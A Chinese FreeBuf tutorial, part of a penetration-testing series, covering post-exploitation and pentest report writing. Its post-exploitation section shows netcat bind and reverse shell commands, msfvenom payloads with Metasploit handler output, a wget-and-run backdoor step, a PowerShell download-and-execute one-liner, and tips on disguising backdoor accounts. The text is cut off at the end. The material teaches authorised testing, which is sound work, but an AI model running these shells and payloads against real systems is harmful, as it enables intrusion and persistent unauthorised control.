---
title: 渗透测试指南（五）后利用及报告
url: https://www.freebuf.com/articles/others-articles/243229.html
source: FreeBuf网络安全行业门户
date: 2024-08-10
fetch_date: 2025-10-06T18:05:08.972244
---

# 渗透测试指南（五）后利用及报告

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

渗透测试指南（五）后利用及报告

* ![]()
* 关注

* [其他](https://www.freebuf.com/articles/others-articles)

渗透测试指南（五）后利用及报告

2024-08-09 15:49:02

渗透测试指南系列文章内容纲要：

> [第一章 渗透测试简介](column/238471.html)
> [第二章 前期交互](column/238471.html)
> [第三章 信息收集](column/238867.html)
> [第四章 漏洞识别](column/238867.html)
> [第五章 社会工程学](column/239520.html)
> [第六章 有线/无线网络利用](column/240371.html)
> 第七章 基于应用的漏洞利用
> 第八章 基于本地主机和物理的利用
> **第九章 后-利用 技术**
> 第十章 渗透测试工具集介绍
> **第十一章 渗透报告**

本文介绍了后渗透利用及渗透测试报告的编写。

# 后渗透利用

后渗透利用是指测试者发现目标的脆弱点，并进一步利用获取目标系统的初级/高级权限后，做的一些操作。比如以目标机器作为跳板进一步内网测试，或者是添加远程控制木马，删除入侵日志信息等。

常见的后利用方式有：
创建绑定shell（bind shell）或反弹shell（reverse shell）
创建调度任务
创建守护进程
创建新用户
创建后门
上传工具
执行ARP扫描
执行DNS和目录服务枚举
执行暴破攻击
配置端口转发
创建SSH隧道
创建VPN隧道

## bind shell & reverse shell

所谓bind shell是指在被入侵的设备开启监听一个端口，这个端口和本地shell进程绑定，攻击者只有连接到这个端口即可执行shell命令。而reverse shell与此相反，攻击者在本地监听一个端口，本入侵设备主动连接攻击者的端口，并提供shell进程交互。

简单来说就是在被入侵设备开启端口监听就是bind shell，在攻击者设备开启端口监听就是反弹shell。

nc，netcat，ncat是一个工具的三个不同名称，被称为“瑞-士-军-刀”。用nc来演示bind shell和reverse shell

### bind shell

使用nc

```
被入侵系统  192.168.1.2
nc -lvp 8888 -e /bin/bash

攻击者      192.168.1.3
nc 192.168.1.2 8888
```

使用meterpreter

```
攻击者      192.168.1.3

# 第一步，生成bind shell的程序，供后续被入侵设备wget下载
# msfvenom -p linux/x86/meterpreter/bind_tcp lport=7777  -f elf -o bshell

# 第三步，使用msf主动连接被入侵设备
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/bind_tcp
payload => linux/x86/meterpreter/bind_tcp
msf5 exploit(multi/handler) > set RHOST 192.168.1.2
RHOST => 192.168.1.2
msf5 exploit(multi/handler) > set LPORT 7777
LPORT => 7777
msf5 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.1.2:7777
[*] Sending stage (985320 bytes) to 192.168.1.2
[*] Meterpreter session 3 opened (192.168.1.3:40231 -> 192.168.1.2:7777) at 2020-05-16 07:44:32 -0400

meterpreter > ls
Listing: /root
==============

Mode              Size     Type  Last modified              Name

被入侵系统  192.168.1.2
第二步
wget http://192.168.1.3/bshell
chmod +x bshell
./bshell &
```

### reverse shell

使用nc

```
被入侵系统  192.168.1.2
nc 192.168.1.3 6666 -e /bin/bash

攻击者      192.168.1.3
nc -lvp 6666
```

使用meterpreter

```
攻击者      192.168.1.3

# 第一步，生成反弹shell的程序，供后续被入侵设备wget下载
# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.3 lport=5555 -f exe -o rshell.exe

# 第三步，使用msf开启监听反弹shell
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.1.3
LHOST => 192.168.1.3
msf5 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf5 exploit(multi/handler) > run

# 当被入侵系统执行rshell.exe时，攻击者可以收到以下反弹shell信息，接下来就可以执行命令了，meterpreter封装了自己的一套命令，是不依赖系统的
[*] Started reverse TCP handler on 192.168.1.3:5555
[*] Sending stage (180291 bytes) to 192.168.1.2
[*] Meterpreter session 1 opened (192.168.1.3:5555 -> 192.168.1.2:60052) at 2020-05-16 07:20:35 -0400
smeterpreter > ls

被入侵系统  192.168.1.2
第二步
wget http://192.168.1.3/rshell.exe
命令行启动 rshell.exe
```

## Command and Control

这个Command and Control有时也被简写为CnC/C2/C&C 。这是一个中间件，攻击者直接控制C2，向C2发送命令以及接收信息，而C2把命令转发给其他被控制设备。

Attack <—-> C2 <—-> Compromised Machine

一些开源的C2框架有：socat, wsc2, WMImplant, DropboxC2, TrevorC2, Twittor, DNSCat2

## 创建调度任务

在windows环境，可以通过在“开始”中搜索 任务计划程序，设置windows下的计划任务。在Linux环境，可以配置/etc/crontab 来设置计划任务。

## 创建守护进程

攻击者入侵系统后，可以上传后门，远程控制木马到系统，并设置为守护进程启动。另外为了持续控制目标系统，还需要配置进程开机自启动，或者是加入到调度任务。

## 创建新用户

攻击者入侵系统后，如果能获取到root或者administrator权限，可以添加一个用户，攻击者可以使用该用户登录控制被入侵的系统。另外添加的用户名最好表现的很正常，最好不要用比如hacker，pentest，等等看上去就是恶意用户的用户名，最后后门用户的密码最好配置为强密码。

## 内网漫游（Lateral Movement）

内网漫游（Lateral Movement）也被称为跳板（Pivoting），内网漫游的意思是攻击者入侵了一台机器，以这个机器为跳板，对机器所在的网络进行横向漏洞挖掘和利用。如果目标网络没有做好网段隔离，就很存在内网漫游威胁。

## 远程访问协议

远程访问分为终端和UI两大类，终端如ssh，telnet等，而UI如Microsoft RDP，Apple Remote Desktop， VNC，X Server Desktop

下面介绍一下通过metasploit来使能远程RDP，前面反弹shell有介绍过用meterpreter来连接目标系统，攻击者首先通过msfvenom生成一个后门进程，把进程传送给被攻击系统，本地通过msf监听反弹shell，在被攻击系统执行后门进程，反弹shell到攻击者。此时攻击者已经通过meterpreter控制目标系统，执行

```
# 首先配置enable_rdp的options
msf > use post/windows/manage/enable_rdp

# 接下来通过meterpreter连接到被入侵系统，这个在前面反弹shell中有讲过，本处不再重复

# 最后执行下面命令开启被入侵系统RDP服务，在被入侵系统的“系统属性--远程--远程桌面”可以确认远程是否被打开
meterpreter > run post/windows/manage/enable_rdp
```

## windows下的post-exploitation

### PowerShell

PowerShell支持非常多命令，比如get-hostfix, get-command, get-process, get-service等

执行远程脚本

```
PS > IEX (New-Object Net.WebClient).DownloadString('http://host/do_some_bad_thing.ps1')
```

### PowerSploit

PowerSploit是一些后渗透利用的一些PowerShell脚本的汇总。PowerSploit的github地址为：<https://github.com/PowerShellMafia/PowerSploit>

PowerShell远程执行可以直接调用PowerSploit里封装好的脚本。一般操作是把PowerSploit clone到攻击环境，再搭建一个简单的http服务器，比如通过python3 -m http.server 80, 接下来直接远程执行对应脚本。

### Empire

Empire是另一款后渗透测试利用框架。github地址为 <https://github.com/EmpireProject/Empire>. 不过这个框架已经停止维护了。

这个工具的使用和msf的meterpreter模块非常类似，首先生成一个payload，然后开启监听，最后payload在目标系统上执行让攻击者可以控制目标系统。

### WMI（Windows Management Instrumentation）

WMI是Windows管理规范（Windows Management Instrumentation）的缩写。

WMI提供了一套内置在Microsoft Windows操作系统中的丰富的系统管理服务，可以在有大量的应用程序、服务和设备的系统中提供全方位的管理功能。

通过WMI接口可以获得的信息量是惊人的，包括硬件设置，状态信息，驱动器配置，BIOS信息，应用程序的设置，事件记录信息，以及其他。

我们前面讲到powershell，比如get-command, get-process, get-service这些命令，都是调用了WMI的接口。

Windows本身提供了几个WMI工具供用户使用，包括WMIC.exe、WBEMTest.exe和WMI Administrative Tools等, 不过WMI Administrative Tools好像微软不再支持了，官网已不再支持下载。

更多WMI相关内容，请查看参考文献[2],[3]。

### Sysinternals 和 PSExec

Sysinternals是微软提供的一套工具集，支持管理员远程控制windows主机。下载地址 <https://docs.microsoft.com/en-us/sysinternals/downloads/>

Sysinternals工具集中PsExec是功能非常强大的攻击之一。PsExec允许攻击者远程执行程序，配置注册表等操作。

比如远程打开一个计算器程序

```
PsExec \\\\vitem_host -u username -p password -d -i calc.exe
```

更多相关内容，请查看参考文献[4]

## 清除痕迹

在前期交互过程，测试人员要和甲方说明清楚清除痕迹和环境恢复流程。一般来说，测试人员在这个阶段，checklist如下：
删除测试过程添加的账户
删除所有测试文件，包括二进制，脚本，临时文件等，安全删除方法在前期交互过程要和甲方确认清楚
把系统配置文件恢复成原样
删除所有后门，守护进程，服务，rootkits等
删除所有甲方用户数据（在提交渗透测试给甲方后）

清除痕迹一定要很细致，比如你通过msf执行某个攻击，但是出现了异常，你此时就需要分析模块执行了什么操作，是否有在目标系统上传脚本或文件，这些都需要被处理。

所以最好是能有一个staging environment（生产环境/模拟环境）提供给渗透测试人员测试，这样恢复起来比较简单。不过有些场景只能在实际环境测试，这时候就得十分小心，清除过程得细致干净。

# 渗透测试报告

进入主题之前，先思考两个问题

> Q1: 如果你所在的公司主机被入侵数据泄露，领导问你是怎么执行渗透测试的，有没有认真工作？ Q2: 测试报告应该在什么时候写，测试过程中还是测试结束后？

写报告要注意的几个点
1 了解报告是给谁看到，如果是高层领导，那就不要一上来就写技术细节，应该在摘要和概括部分多花点精力描述，如果是开发人员，那应该在步骤复现，修复建议等内容上细致描述
2 避免直接从漏洞扫描器上复制粘贴到渗透测试报告中，因为扫描器可能有假阳性漏洞，一定要认证排查确认是漏洞后再写入报告
3 把扫描器结果和环境关联，比如扫描器报告系统开启21端口ftp服务，版本是最新的，就这个信息你都无法评低危，但假设你发现这个ftp服务用于存储敏感数据，并且公司声明不再使用该ftp，结果就不一样了。
4 测试报告应该在测试过程中不断完善，不要等到测试结束再去编写报告。因为测试过程你可以写的更细致，资源也多。如果等到测试结束后，可能会遗漏一些细节，或者要补充信息时要重新配置环境测试。

## dradis

[Dradis](https://dradis.com)框架是一个开源的协作和报告平台。

关于dradis的简单使用，可查看这篇博客<https://www.hackingarticles.in/dradis-reporting-and-collaboration-tool/>

我看kali里没有默认安装dradis，就按照下列命令安装dradis

```
apt-get install libsqlite3-dev
 apt-get install zlib1g-dev
 git clone https://github.com/dradis/dradis-ce.git
 cd dradis-ce/
 ./bin/setup
 vim Gemfile    #修改ruby版本为本机版本
 ./bin/setup
 bundle install
 ./bin/rails server -b 0.0.0.0
```

## 渗透测试报告模板

<https://github.com/The-Art-of-Hacking/h4cker/tree/master/pen_testing_reports>这个仓库收集了几个渗透测试模板，比如PCI-DSS，SANS，Offensive Security等

目标用户不同，测试报告内容也会有不同的偏重。给领导看的报告就不需要太体现漏洞技术细节，而给技术人员看的报告就要求细致，精确。

建议读者看看PCI-DSS和SANS的模板，这两份模板都很有参考价值。读者可以根据自己的环境背景，基于这些模板定制自己的测试报告模板。

一般来说，...